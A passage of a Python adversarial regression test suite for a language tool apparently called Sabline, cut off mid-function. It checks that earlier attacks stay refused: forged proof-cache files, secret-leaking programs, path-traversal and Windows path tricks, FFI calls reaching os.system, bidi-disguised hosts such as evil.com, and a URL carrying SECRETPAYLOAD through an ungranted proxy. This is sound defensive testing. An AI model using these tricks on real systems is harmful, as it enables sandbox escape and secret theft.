#!/usr/bin/env python3
"""Adversarial regression suite.

Every case here is an attempt from the 7.1.1 adversarial security pass,
kept as a test so it stays closed. Two shapes:

  * The holes that pass found and 7.1.2 fixed, each of which must now be
    refused (the proof-cache poisoning, native recursion, a giant
    expression, an oversized read).
  * The attempts that were already refused - secrets, sandbox paths, the
    ffi reach, self-influence, the pool - kept so a later change cannot
    quietly reopen them. Named after the pass's own identifiers
    (S1..S16, FS1.., FFI1.., T3a..).

Runtime only where it can be (no theorem prover needed), so it behaves
the same on the full and minimal CI legs; a case whose answer depends on
the prover says so and asserts the runtime check when z3 is absent.

    python check_adversarial.py
"""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any, cast

HERE = Path(__file__).parent
SABLINE = str(HERE / "sabline.py")
sys.path.insert(0, str(HERE))
import sabline  # noqa: E402
from suite_dirs import isolate  # noqa: E402

WORK = isolate("check_adversarial")

try:
    import z3  # noqa: F401
    HAVE_Z3 = True
except ImportError:
    HAVE_Z3 = False

PASS = 0
FAIL = 0


def ok(label: Any, cond: Any, detail: object = "") -> None:
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"PASS  {label}")
    else:
        FAIL += 1
        print(f"FAIL  {label}   {detail}")


def run(args: Any, cwd: Any = None, env: Any = None, stdin: Any = None, timeout: int = 60, unset: Any = ()) -> tuple[Any, ...]:
    """Run sabline; return (exit_code, combined_output, seconds). `unset`
    names variables the child does not inherit."""
    import time
    e = dict(os.environ)
    if env:
        e.update(env)
    for name in unset:
        e.pop(name, None)
    t0 = time.perf_counter()
    try:
        r = subprocess.run([sys.executable, SABLINE] + args,
                           capture_output=True, text=True, cwd=cwd, env=e,
                           input=stdin, timeout=timeout)
        return r.returncode, r.stdout + r.stderr, time.perf_counter() - t0
    except subprocess.TimeoutExpired as ex:
        return -99, os.fsdecode(ex.stdout or "") + os.fsdecode(ex.stderr or "") + \
            f"\n[TIMEOUT {timeout}s]", time.perf_counter() - t0


def prog(d: Any, text: Any, name: str = "p.vel") -> Any:
    p = os.path.join(d, name)
    with open(p, "w", encoding="utf-8") as f:
        f.write(text)
    return name


# ---------------------------------------------------------------------------
# The proof cache: CACHE-1 to CACHE-10. From 2.29 to 8.1.1 Sabline kept proof
# results on disk, and two holes came of it: a ./.sabline/proofs.json shipped
# beside a program was believed until 7.1.2 (advisory-proof-cache.md), and an
# entry planted in the per-user directory until 8.1.1
# (advisory-proof-cache-2.md). Both times a false `ensures` was reported
# proven and, compiled to native code, ran unchecked. 8.2 removed the cache.
# Each case plants what used to work - 8.1.1's file format, under the key
# 8.1.1 computed, where 8.1.1 looked - and holds that nothing reads it:
# every report and every run is what it is without the plant, and nothing is
# written where a cache used to be.
# ---------------------------------------------------------------------------
FALSE = ("fn double(n: Int) -> Int\n"
         "  ensures result == n + n\n"
         "{ return n + 1000000 }\n"
         "fn main() uses io { print(to_text(double(5))) }\n")

LOOP_LIE = ("fn count(n: Int) -> Int\n"
            "  requires n >= 0\n"
            "  ensures result == n + 1\n"
            "{\n"
            "  let i = 0\n"
            "  while i < n { i = i + 1 }\n"
            "  return i\n"
            "}\n"
            "fn main() uses io { print(to_text(count(5))) }\n")

TRUE = ("fn add1(n: Int) -> Int\n  ensures result == n + 1\n"
        "{ return n + 1 }\n"
        "fn main() uses io { print(to_text(add1(1))) }\n")

_CACHE_VARS = ("SABLINE_CACHE_DIR", "XDG_CACHE_HOME", "LOCALAPPDATA")

# what 8.1.1 had for reading and writing the cache; none may come back
_CACHE_NAMES = ("proof_key", "stmt_key", "_user_cache_dir", "_proof_cache_ref",
                "_cache_load", "_cache_save", "_cache_read", "_cache_document",
                "_cache_dirs_made", "PROOF_CACHE_SCHEMA", "CACHE_DIR_ENV",
                "CACHE_DIR", "CACHE_FILE", "REPROOF_SECONDS_FLOOR")


def _key_8_1_1(fn: Any, table: Any, records: Any) -> Any:
    """proof_key as 8.1.1 computed it - the function's contract and text,
    its callees' contracts and the records - so a plant carries the key a
    cache once looked up. Sabline itself has no such function any more."""
    import dataclasses
    import hashlib

    def contract_of(f: Any) -> str:
        return "|".join([
            f.name, str(f.params), str(f.return_type),
            ",".join(sorted(f.effects)), str(f.can_fail),
            ";".join(sabline.expr_str(e) for e, _ in f.requires),
            ";".join(sabline.expr_str(e) for e, _ in f.ensures)])

    called = set()

    def walk(node: Any) -> None:
        if isinstance(node, (list, tuple)):
            for x in node:
                walk(x)
            return
        if not dataclasses.is_dataclass(node):
            return
        if isinstance(node, sabline.Call):
            called.add(node.name)
        for f in dataclasses.fields(node):
            walk(getattr(node, f.name))

    def show(node: Any) -> str:
        if isinstance(node, (list, tuple)):
            return "[" + ",".join(show(x) for x in node) + "]"
        if not dataclasses.is_dataclass(node):
            return repr(node)
        inner = ",".join(f"{f.name}={show(getattr(node, f.name))}"
                         for f in dataclasses.fields(node) if f.name != "line")
        return f"{type(node).__name__}({inner})"

    walk(fn.body)
    walk([e for e, _ in fn.requires])
    walk([e for e, _ in fn.ensures])
    parts = [sabline.VERSION, contract_of(fn), show(fn.body)]
    parts += [contract_of(table[n]) for n in sorted(called) if n in table]
    parts += [f"{r.name}:{r.fields}" for r in records]
    return hashlib.sha256("\n".join(parts).encode("utf-8")).hexdigest()


def _cache_base() -> tuple[Any, ...]:
    """A directory, and the environment that pointed 8.1.1's cache under
    it: SABLINE_CACHE_DIR, XDG_CACHE_HOME and LOCALAPPDATA all name it, so
    <base>/sabline/proofs is where 8.1.1 read on every system."""
    base = os.path.realpath(tempfile.mkdtemp(prefix="cachebase_", dir=WORK))
    return base, {name: base for name in _CACHE_VARS}


def _files_under(root: Any) -> Any:
    """{relative path: bytes} of every file under root."""
    out = {}
    for dp, _, names in os.walk(root):
        for name in names:
            p = os.path.join(dp, name)
            with open(p, "rb") as fh:
                out[os.path.relpath(p, root)] = fh.read()
    return out


def plant_local(d: Any) -> None:
    """7.1.2's hole: ./.sabline/proofs.json beside the program, every
    promise-carrying function "proven" under its 8.1.1 key."""
    funcs, records = sabline.load_program(os.path.join(d, "p.vel"))
    table = {f.name: f for f in funcs}
    keys = [_key_8_1_1(f, table, records) for f in funcs
            if f.ensures or f.requires]
    os.makedirs(os.path.join(d, ".sabline"), exist_ok=True)
    with open(os.path.join(d, ".sabline", "proofs.json"), "w") as f:
        json.dump({k: {"proven": True, "errors": []} for k in keys}, f)


def plant_user(d: Any, base: Any, fn_name: Any, whole: bool = True) -> Any:
    """8.1.1's hole: the per-user file 8.1.1 read for d/p.vel with the cache
    under `base` - its header naming the file's real path, bytes and
    version, one entry claiming `fn_name` proven. With whole=False, the
    first half of that file. Returns the file."""
    import hashlib
    path = os.path.join(d, "p.vel")
    funcs, records = sabline.load_program(path)
    table = {f.name: f for f in funcs}
    ap = os.path.normcase(os.path.abspath(path))
    with open(path, encoding="utf-8") as fh:
        ch = hashlib.sha256(fh.read().encode("utf-8")).hexdigest()
    tag = hashlib.sha256((ap + "\0" + sabline.VERSION + "\0" + ch)
                         .encode("utf-8")).hexdigest()
    proofs = os.path.join(base, "sabline", "proofs")
    os.makedirs(proofs, exist_ok=True)
    cache_file = os.path.join(proofs, tag + ".json")
    blob = json.dumps({"schema": "sabline.proofcache/1", "path": ap,
                       "version": sabline.VERSION, "content_sha256": ch,
                       "proofs": {_key_8_1_1(table[fn_name], table, records):
                                  {"proven": True, "errors": [],
                                   "seconds": 0.01}}}).encode("utf-8")
    with open(cache_file, "wb") as fh:
        fh.write(blob if whole else blob[:len(blob) // 2])
    if os.name == "posix":
        os.chmod(cache_file, 0o600)
    return cache_file


class _redirected:
    """In this process, the environment the outside passes ran sabline in:
    every cache variable naming `base`."""

    def __init__(self, base: Any) -> None:
        self.base = base

    def __enter__(self) -> None:
        self.saved = {k: os.environ.get(k) for k in _CACHE_VARS}
        for k in _CACHE_VARS:
            os.environ[k] = self.base

    def __exit__(self, *exc: Any) -> None:
        for k, v in self.saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def _says_proven(out: Any) -> bool:
    """Whether check, proofs --sarif, audit or explain output calls one
    promise proven."""
    return any(s in out for s in ("1 with proven", "[proven", '"proven": 1'))


def _sabline_source() -> str:
    """All of Sabline's own source text: sabline.py, or every module of the
    package it became."""
    where = Path(sabline.__file__)
    files = (sorted(where.parent.glob("*.py")) if where.name == "__init__.py"
             else [where])
    return "\n".join(p.read_text(encoding="utf-8") for p in files)


PROOF_COMMANDS = (("check", ["check", "p.vel"]),
                  ("proofs", ["proofs", "p.vel", "--sarif"]),
                  ("audit", ["audit", "p.vel"]),
                  ("explain", ["explain", "p.vel"]),
                  ("run", ["p.vel", "--allow", "io"]),
                  ("run --no-native", ["p.vel", "--allow", "io",
                                       "--no-native"]))


def cache_cases() -> None:
    # CACHE-1: 7.1.2's plant, a ./.sabline/proofs.json beside the program
    base, env = _cache_base()
    d = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d, FALSE)
    plant_local(d)
    planted = _files_under(os.path.join(d, ".sabline"))
    for mode, label in (([], "native"), (["--no-native"], "--no-native")):
        code, out, _ = run(["p.vel", "--allow", "io"] + mode, cwd=d, env=env)
        ok(f"CACHE-1 a ./.sabline/ plant: the run {label} is refused "
           f"(E700/E601), not exit 0",
           code != 0 and ("E700" in out or "E601" in out), out[:160])
    if HAVE_Z3:
        for label, args in PROOF_COMMANDS[:4]:
            code, out, _ = run(args, cwd=d, env=env)
            said = '"ruleId": "E700"' if label == "proofs" else "E700"
            ok(f"CACHE-1 a ./.sabline/ plant: {label} refutes the promise "
               f"(z3)", code != 0 and said in out and "1000005" not in out,
               out[:160])
    dv = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(dv, TRUE)
    plant_local(dv)
    code, out, _ = run(["audit", "p.vel"], cwd=dv, env=env)
    ok("CACHE-1 ...nothing looks in ./.sabline/: the audit does not mention "
       "it, and the plant is as it was",
       code == 0 and ".sabline" not in out
       and _files_under(os.path.join(d, ".sabline")) == planted, out[:160])

    # CACHE-2: nothing is written, where a cache was or anywhere near it
    base2, env2 = _cache_base()
    d2 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d2, TRUE)
    outs = [run(args, cwd=d2, env=env2) for _, args in PROOF_COMMANDS]
    ok("CACHE-2 check, proofs, audit, explain and both runs write nothing "
       "under the directory every cache variable names, nor beside the "
       "program",
       all(c == 0 for c, _, _ in outs) and _files_under(base2) == {}
       and os.listdir(base2) == [] and sorted(os.listdir(d2)) == ["p.vel"],
       f"{[c for c, _, _ in outs]} {os.listdir(base2)} {os.listdir(d2)}")
    if HAVE_Z3:
        ok("CACHE-2 ...and the promise is proven all the same (z3)",
           "1 with proven" in outs[0][1], outs[0][1][:160])


def user_cache_cases() -> None:
    base, env = _cache_base()

    # CACHE-3: 8.1.1's plant, under every command that reports a promise and
    # both ways of running
    d = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d, FALSE)
    planted = plant_user(d, base, "double")
    before = _files_under(base)
    for label, args in PROOF_COMMANDS:
        code, out, _ = run(args, cwd=d, env=env)
        if HAVE_Z3:
            said = '"ruleId": "E700"' if label == "proofs" else "E700"
            ok(f"CACHE-3 a per-user plant for a false ensures, {label}: E700 "
               f"(z3)", code != 0 and said in out and "1000005" not in out,
               out[:200])
        elif label.startswith("run"):
            ok(f"CACHE-3 a per-user plant for a false ensures, {label}: E601 "
               f"(no z3)", code != 0 and "E601" in out, out[:200])
        else:
            ok(f"CACHE-3 a per-user plant for a false ensures, {label}: not "
               f"proven (no z3)", code == 0 and not _says_proven(out),
               out[:200])
    ok("CACHE-3 ...and no command read or rewrote the planted file: it is "
       "byte for byte what was planted, and nothing was added",
       os.path.exists(planted) and _files_under(base) == before,
       sorted(_files_under(base)))

    # CACHE-4: the strongest plant - a lie no prover refutes, which only the
    # runtime check catches, so a believed entry was the whole defence
    d4 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d4, LOOP_LIE)
    plant_user(d4, base, "count")
    with _redirected(base):
        funcs, records = sabline.load_program(os.path.join(d4, "p.vel"))
        proven: set[str]
        errs: list[Any]
        proven, errs = set(), []
        sabline.check_proofs(funcs, records, errs, proven)
    ok("CACHE-4 with a plant for a lie no prover refutes, check_proofs "
       "neither calls it proven nor makes native code of it",
       "count" not in proven
       and "count" not in sabline.native_eligible(funcs, proven), str(proven))
    for label, args in PROOF_COMMANDS[4:]:
        code, out, _ = run(args, cwd=d4, env=env)
        ok(f"CACHE-4 ...{label} stops at the runtime check (E601) rather "
           f"than print 5 and exit 0", code != 0 and "E601" in out,
           out[:200])
    for label in ("check", "audit"):
        code, out, _ = run([label, "p.vel"], cwd=d4, env=env)
        ok(f"CACHE-4 ...{label} does not report it proven",
           code == 0 and not _says_proven(out), out[:200])

    # CACHE-5: a second check is the first check again
    base5, env5 = _cache_base()
    d5 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d5, TRUE)
    first = run(["check", "p.vel"], cwd=d5, env=env5)
    second = run(["check", "p.vel"], cwd=d5, env=env5)
    ok("CACHE-5 a second check says exactly what the first said, and "
       "nothing was kept between them",
       first[0] == second[0] == 0 and first[1] == second[1]
       and (not HAVE_Z3 or "1 with proven" in second[1])
       and os.listdir(base5) == [], second[1][:160])

    # CACHE-6: a torn cache file is not read either; and nothing that read
    # or wrote one is left in Sabline
    base6, env6 = _cache_base()
    d6 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d6, TRUE)
    torn = plant_user(d6, base6, "add1", whole=False)
    torn_bytes = open(torn, "rb").read()
    code, out, _ = run(["check", "p.vel"], cwd=d6, env=env6)
    ok("CACHE-6 a torn cache file on disk: the check is the check with none, "
       "and the file is left exactly as it was",
       code == 0 and (not HAVE_Z3 or "1 with proven" in out)
       and open(torn, "rb").read() == torn_bytes, out[:160])
    left = [n for n in _CACHE_NAMES if hasattr(sabline, n)]
    ok("CACHE-6 Sabline has no cache reader, writer, key or location left",
       not left, str(left))

    # CACHE-7: no directory is made where the cache went, for any command,
    # and a base that is a link gains nothing either
    base7, env7 = _cache_base()
    d7 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d7, TRUE)
    for _, args in PROOF_COMMANDS:
        run(args, cwd=d7, env=env7)
    made = os.listdir(base7)
    if os.name == "posix":
        real = os.path.realpath(tempfile.mkdtemp(prefix="realbase_", dir=WORK))
        link = os.path.join(WORK, f"linkbase-{os.getpid()}")
        os.symlink(real, link)
        run(["check", "p.vel"], cwd=d7, env={k: link for k in _CACHE_VARS})
        made += os.listdir(real)
    ok("CACHE-7 no command makes a sabline directory under the cache "
       "variables' directory (or, on POSIX, through a link to one)",
       made == [], str(made))

    # CACHE-8: a relative XDG_CACHE_HOME or LOCALAPPDATA once put the cache
    # in the directory sabline ran in - the program's
    d8 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    home = os.path.realpath(tempfile.mkdtemp(prefix="home_", dir=WORK))
    prog(d8, TRUE)
    code, out, _ = run(["check", "p.vel"], cwd=d8,
                       env={"XDG_CACHE_HOME": ".", "LOCALAPPDATA": ".",
                            "HOME": home, "USERPROFILE": home},
                       unset=("SABLINE_CACHE_DIR",))
    ok("CACHE-8 with XDG_CACHE_HOME and LOCALAPPDATA relative, nothing is "
       "written beside the program or under the home directory",
       code == 0 and sorted(os.listdir(d8)) == ["p.vel"]
       and _files_under(home) == {}, f"{os.listdir(d8)} {out[:120]}")

    # CACHE-9: the library and the language server, with the plant present
    path4 = os.path.join(d4, "p.vel")
    with _redirected(base):
        c = sabline.check(LOOP_LIE, path=path4, timeout=None,
                          max_memory_mb=None)
        where = path4.replace(os.sep, "/")
        uri = "file://" + ("" if where.startswith("/") else "/") + where
        lenses = sabline.editor_answer("textDocument/codeLens", {}, LOOP_LIE,
                                       uri)
    ok("CACHE-9 the library does not report the planted lie proven",
       "count" not in c.proven, str(c.proven))
    titles = [lens["command"]["title"] for lens in lenses or []]
    ok("CACHE-9 the language server's lens does not call it proven",
       bool(titles) and not any("proven" in t for t in titles), str(titles))

    # CACHE-10: what is left of the cache's interface does nothing
    action = (HERE / "action.yml").read_text(encoding="utf-8")
    ok("CACHE-10 the Action names no cache flag, variable or command",
       not any(w in action for w in ("--no-cache", "SABLINE_CACHE_DIR",
                                     "sabline clean")))
    source = _sabline_source()
    ok("CACHE-10 Sabline's source reads no SABLINE_CACHE_DIR and writes no "
       "proof cache schema",
       "SABLINE_CACHE_DIR" not in source and "proofcache" not in source)
    d10 = os.path.realpath(tempfile.mkdtemp(dir=WORK))
    prog(d10, TRUE)
    for label, args in (("check", ["check", "p.vel"]),
                        ("a run", ["p.vel", "--allow", "io"])):
        plain = run(args, cwd=d10)
        flagged = run(args + ["--no-cache"], cwd=d10)
        extra = [ln for ln in flagged[1].splitlines()
                 if ln not in plain[1].splitlines()]
        ok(f"CACHE-10 --no-cache on {label} does nothing but say, once, that "
           f"it is deprecated",
           plain[0] == flagged[0] and len(extra) == 1
           and "deprecated" in extra[0] and "9.0" in extra[0],
           f"{plain[0]} {flagged[0]} {extra}")
    stale = plant_user(d10, base, "add1")
    os.makedirs(os.path.join(d10, ".sabline"), exist_ok=True)
    code, out, _ = run(["clean"], cwd=d10, env=env)
    ok("CACHE-10 sabline clean exits 0, says it is deprecated, and deletes "
       "nothing",
       code == 0 and "deprecated" in out and os.path.exists(stale)
       and os.path.isdir(os.path.join(d10, ".sabline")), out[:160])


# ---------------------------------------------------------------------------
# #3 (target 6): non-terminating recursion reaches E609 in BOTH modes, fast,
# on every platform - native codegen no longer hides the depth guard.
# ---------------------------------------------------------------------------
def recursion_cases() -> None:
    d = tempfile.mkdtemp()
    prog(d, "fn rec(n: Int) -> Int { return rec(n + 1) }\n"
            "fn main() uses io { print(to_text(rec(0))) }\n")
    for mode, label in (([], "native"), (["--no-native"], "--no-native")):
        code, out, secs = run(["p.vel", "--allow", "io"] + mode, cwd=d,
                              timeout=15)
        ok(f"D3 runaway recursion -> E609 ({label}), no hang/crash",
           "E609" in out and code == 1 and secs < 5, f"{secs:.1f}s {out[:120]}")


# ---------------------------------------------------------------------------
# #4 (target 6): a giant expression is a clean E102, not a traceback; a read
# over the ceiling is E316, and --max-read raises it.
# ---------------------------------------------------------------------------
def compiler_limits_cases() -> None:
    d = tempfile.mkdtemp()
    big = "+".join(["n"] * 6000)
    prog(d, f"fn f(n: Int) -> Int {{ return {big} }}\n"
            "fn main() uses io { print(to_text(f(1))) }\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("#4a giant expression -> clean E102, no traceback",
       "E102" in out and "Traceback" not in out, out[:160])

    d2 = tempfile.mkdtemp()
    big_file = os.path.join(d2, "big.txt")
    with open(big_file, "w") as f:
        f.write("A" * (80 * 1024 * 1024))
    prog(d2, 'fn main() uses fs, io { check read_file("big.txt") '
             '{ ok v { print(to_text(length(v))) } fail w { print("f") } } }\n')
    grant = "fs:read:" + d2 + ",io"
    code, out, _ = run(["p.vel", "--allow", grant], cwd=d2)
    ok("#4b read over the ceiling -> E316", "E316" in out and code != 0,
       out[:160])
    code, out, _ = run(["p.vel", "--allow", grant, "--max-read", "200"],
                       cwd=d2)
    ok("#4b --max-read raises the ceiling", code == 0 and "83886080" in out,
       out[:160])
    os.remove(big_file)


# ---------------------------------------------------------------------------
# Target 1 - secrets. Each must be refused; none may reach stdout with a
# secret. (S3 and the map-facts case are the honest ones that still run.)
# ---------------------------------------------------------------------------
SECRET = [
    ("S1 print(env)", 'fn main() uses io, env { print(env("K", "")) }',
     "io,env", "E560"),
    ("S2 length-loop oracle",
     'fn main() uses io, env {\n  let k = env("K", "")\n  let i = 0\n'
     '  while i < length(k) { i = i + 1 }\n  print(to_text(i))\n}',
     "io,env", "E563"),
    ("S4 generic launder",
     'fn has_it(xs: List of T, item: T) -> Bool for any T {\n'
     '  let i = 0\n  while i < length(xs) {\n'
     '    if get(xs, i) == item { return true }\n    i = i + 1\n  }\n'
     '  return false\n}\n'
     'fn main() uses io, env { print(to_text(has_it(["a"], env("K","")))) }',
     "io,env", None),                      # E542 or E560, both are refusals
    ("S5 to_text(secret)",
     'fn main() uses io, env { print(to_text(env("K",""))) }', "io,env",
     "E560"),
    ("S6 secret as file name",
     'fn main() uses fs, env {\n'
     '  check read_file(env("K","x")) { ok v { } fail w { } }\n}',
     "fs,env", "E560"),
    ("S7 exit_with(length secret)",
     'fn main() uses io, env { exit_with(length(env("K",""))) }', "io,env",
     "E560"),
    ("S9 format secret",
     'fn main() uses io, env { print(format("k={}", env("K",""))) }',
     "io,env", "E560"),
    ("S10 json_of secret",
     'fn main() uses io, env { print(json_of(env("K",""))) }', "io,env",
     "E560"),
    ("S16 code_at rebuild",
     'fn main() uses io, env {\n  let k = env("K","")\n'
     '  print(to_text(code_at(k, 0) + 1))\n}', "io,env", "E560"),
]


def secret_cases() -> None:
    for label, src, allow, code_want in SECRET:
        d = tempfile.mkdtemp()
        prog(d, src + "\n")
        code, out, _ = run(["p.vel", "--allow", allow], cwd=d,
                           env={"K": "SUPERSECRET42"})
        refused = code != 0 and "SUPERSECRET42" not in out and \
            (code_want is None or code_want in out)
        ok(f"{label} refused, secret never emitted", refused, out[:140])
    # S3: a secret in a requires is allowed (one bit per run, documented)
    d = tempfile.mkdtemp()
    prog(d, 'fn guard(k: Secret of Text) -> Int requires length(k) > 0 '
            '{ return 1 }\nfn main() uses io, env '
            '{ print(to_text(guard(env("K","x")))) }\n')
    code, out, _ = run(["p.vel", "--allow", "io,env"], cwd=d,
                       env={"K": "x"})
    ok("S3 secret in a requires still runs (documented)",
       code == 0 and "SECRET" not in out, out[:120])


# ---------------------------------------------------------------------------
# Target 2 - sandbox paths (a subset; check_sandbox has the full set). The
# Windows-specific tricks run only on Windows.
# ---------------------------------------------------------------------------
def _read_prog(pathexpr: Any) -> str:
    return ('fn main() uses fs, io {\n'
            f'  check read_file({pathexpr}) {{ ok v {{ print("LEAK:" + v) }} '
            'fail w { print("fail") } }\n}\n')


def sandbox_cases() -> None:
    base = tempfile.mkdtemp()
    allowed = os.path.join(base, "allowed")
    os.makedirs(allowed)
    open(os.path.join(base, "secret.txt"), "w").write("TOPSECRET")
    grant = "fs:read:" + allowed + ",io"

    def vq(s: str) -> str:
        return '"' + s.replace("\\", "\\\\") + '"'

    tricks = [("FS1 dotdot", "../secret.txt"),
              ("FS2 abs sibling", os.path.join(base, "secret.txt")),
              ("FS3 forward slashes",
               os.path.join(base, "secret.txt").replace("\\", "/"))]
    if os.name == "nt":
        tricks += [("FS7 ::$DATA", os.path.join(base, "secret.txt::$DATA")),
                   ("FS9 trailing dot",
                    os.path.join(base, "secret.txt.")),
                   ("FS11 mixed case",
                    os.path.join(base, "secret.txt").upper())]
    for label, path in tricks:
        prog(base, _read_prog(vq(path)))
        code, out, _ = run(["p.vel", "--allow", grant], cwd=base)
        ok(f"{label} refused (E313), secret not leaked",
           "TOPSECRET" not in out and "E313" in out, out[:140])
    if os.name == "nt":
        prog(base, 'fn main() uses fs, io { write_file("NUL", "x") '
                   'print("WROTE") }\n')
        code, out, _ = run(["p.vel", "--allow", "fs:write:" + allowed + ",io"],
                           cwd=base)
        ok("FS8 device NUL refused (E313)",
           "E313" in out and "WROTE" not in out, out[:140])


# ---------------------------------------------------------------------------
# Target 2 - the ffi reach check. codecs/os/builtins must be refused even
# under a granted module.
# ---------------------------------------------------------------------------
FFI = [
    ("FFI1 codecs via json",
     'fn main() uses io, ffi {\n'
     '  check py("json", "codecs.encode", ["x"]) { ok v { print("REACHED") } '
     'fail w { print("f") } }\n}', "io,ffi:json"),
    ("FFI2 os.system under ffi:math",
     'fn main() uses io, ffi {\n'
     '  check py("os", "system", ["echo x"]) { ok v { print("REACHED") } '
     'fail w { print("f") } }\n}', "io,ffi:math"),
    ("FFI5 __class__ to builtins",
     'fn main() uses io, ffi {\n'
     '  check py("json", "dumps.__class__.__base__", ["x"]) '
     '{ ok v { print("REACHED") } fail w { print("f") } }\n}', "io,ffi:json"),
]


def ffi_cases() -> None:
    for label, src, allow in FFI:
        d = tempfile.mkdtemp()
        prog(d, src + "\n")
        code, out, _ = run(["p.vel", "--allow", allow], cwd=d)
        ok(f"{label} refused (E311), module not reached",
           "E311" in out and "REACHED" not in out, out[:140])
    # a non-JSON return is reach-checked before it can become a handle:
    # importlib.import_module("os") via py yields only a repr string
    d = tempfile.mkdtemp()
    prog(d, 'fn main() uses io, ffi {\n'
            '  check py_new("importlib", "import_module", "[\\"os\\"]") '
            '{ ok h { print("GOT HANDLE") } fail w { print("f") } }\n}\n')
    code, out, _ = run(["p.vel", "--allow", "io,ffi:importlib"], cwd=d)
    ok("FFI6 importlib->os as a handle is reach-refused (E311)",
       "E311" in out and "GOT HANDLE" not in out, out[:140])


# ---------------------------------------------------------------------------
# Target 3 - self-influence. Shadowed builtins never win; bidi/zero-width
# outside a string is E000; a host is enforced on real bytes.
# ---------------------------------------------------------------------------
def self_influence_cases() -> None:
    d = tempfile.mkdtemp()
    prog(d, 'fn print(x: Secret of Text) uses io { }\n'
            'fn main() uses io, env { print(env("K","")) }\n')
    code, out, _ = run(["p.vel", "--allow", "io,env"], cwd=d,
                       env={"K": "SECRETVAL"})
    ok("T3a user print never shadows the builtin (E560)",
       "E560" in out and "SECRETVAL" not in out, out[:140])

    d = tempfile.mkdtemp()
    prog(d, 'fn main() uses io {\n  let x = 1‮0\n  print(to_text(x))\n}\n')
    code, out, _ = run(["p.vel", "--allow", "io"], cwd=d)
    ok("T3c bidi override outside a string -> E000",
       "E000" in out and code != 0, out[:140])

    d = tempfile.mkdtemp()
    prog(d, 'fn ma​in() uses io { print("hi") }\n')
    code, out, _ = run(["p.vel", "--allow", "io"], cwd=d)
    ok("T3d zero-width in an identifier -> E000",
       "E000" in out and code != 0, out[:140])

    d = tempfile.mkdtemp()
    prog(d, 'fn main() uses net {\n'
            '  check fetch("http://evil.com‮/") { ok v { } fail w { } }\n}\n')
    code, out, _ = run(["p.vel", "--allow", "net:good.com"], cwd=d)
    ok("T3e a host with a bidi char is enforced on real bytes (E314)",
       "E314" in out, out[:140])


# ---------------------------------------------------------------------------
# Target 1 - `sabline trace` prints <secret>, never the plaintext.
# ---------------------------------------------------------------------------
def trace_cases() -> None:
    d = tempfile.mkdtemp()
    prog(d, 'fn wrap(k: Secret of Text) -> Secret of Text '
            '{ return "Bearer " + k }\n'
            'fn main() uses io, env {\n  let key = env("API_KEY", "hunter2xyz")\n'
            '  let w = wrap(key)\n  print("done")\n}\n')
    code, out, _ = run(["trace", "p.vel", "--allow", "io,env"], cwd=d,
                       env={"API_KEY": "hunter2xyz"})
    ok("TRACE redacts a secret (<secret>, never the plaintext)",
       "<secret>" in out and "hunter2xyz" not in out, out[:160])


# ---------------------------------------------------------------------------
# Target 5 - a counterexample over a secret parameter shows an invented
# value, never the runtime secret (compile-time; no runtime value exists).
# ---------------------------------------------------------------------------
def witness_cases() -> None:
    if not HAVE_Z3:
        ok("E700-WITNESS secret-param counterexample (skipped: no z3)", True)
        return
    d = tempfile.mkdtemp()
    prog(d, "fn bad(k: Secret of Text) -> Int\n  ensures result == length(k)\n"
            "{ return 5 }\nfn main() uses io { print(\"x\") }\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("E700-WITNESS refutes a secret-param promise without a runtime secret",
       "E700" in out, out[:160])


# ---------------------------------------------------------------------------
# Target 8 - the Pool resets args and per-run state between programs.
# ---------------------------------------------------------------------------
def pool_cases() -> None:
    pool = sabline.Pool(allow={"io"}, timeout=10)
    try:
        a = pool.run('fn main() uses io { print("A:" + to_text(length(args()))) }\n',
                     args=["LEAKED"])
        b = pool.run('fn main() uses io { print("B:" + to_text(length(args()))) }\n')
        ok("POOL args do not leak from run A to run B",
           a.ok and b.ok and "A:1" in a.output and "B:0" in b.output,
           f"{a.output!r} {b.output!r}")
    finally:
        pool.close()


# ---------------------------------------------------------------------------
# The 8.0 breaks, kept closed. Each is an attempt from the 8.0 adversarial
# pass that must stay refused (or, for the honest halves, stay allowed).
# ---------------------------------------------------------------------------
def _listener() -> tuple[Any, ...]:
    """A one-shot socket that records the request it receives. Stands in
    for an un-granted proxy: nothing granted may reach it."""
    import socket
    import threading
    got = {}
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]

    def serve() -> None:
        try:
            c, _ = srv.accept()
            c.settimeout(3)
            d = b""
            while b"\r\n\r\n" not in d and len(d) < 8192:
                ch = c.recv(1024)
                if not ch:
                    break
                d += ch
            got["req"] = d.decode("latin1", "replace")
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length:2\r\n"
                      b"Connection: close\r\n\r\nhi")
            c.close()
        except Exception as e:      # noqa: BLE001 - a probe, not a service
            got["err"] = repr(e)

    threading.Thread(target=serve, daemon=True).start()
    return got, port


def proxy_break_cases() -> None:
    """Break 1: a net grant bounds the socket peer, not the URL string.
    The pass's exact program is refused (E317); the same program with the
    proxy granted succeeds; no proxy variables set -> no E317."""
    import time
    prog_text = ('fn main() uses net {\n'
                 '  check fetch("http://api.vendor.example/x?d=SECRETPAYLOAD")'
                 ' { ok b { } fail w { } }\n}\n')
    for env_key in ("HTTP_PROXY", "http_proxy"):
        got, port = _listener()
        d = tempfile.mkdtemp()
        prog(d, prog_text)
        code, out, _ = run(["p.vel", "--allow", "net:api.vendor.example"],
                           cwd=d, env={env_key: f"http://127.0.0.1:{port}"})
        time.sleep(0.3)
        ok(f"B1 ambient {env_key} to an ungranted proxy -> E317, no leak",
           "E317" in out and "SECRETPAYLOAD" not in got.get("req", ""),
           f"exit {code}, proxy saw {got.get('req', '')[:60]!r}")
    # the same program with the proxy granted succeeds and reaches it
    got, port = _listener()
    d = tempfile.mkdtemp()
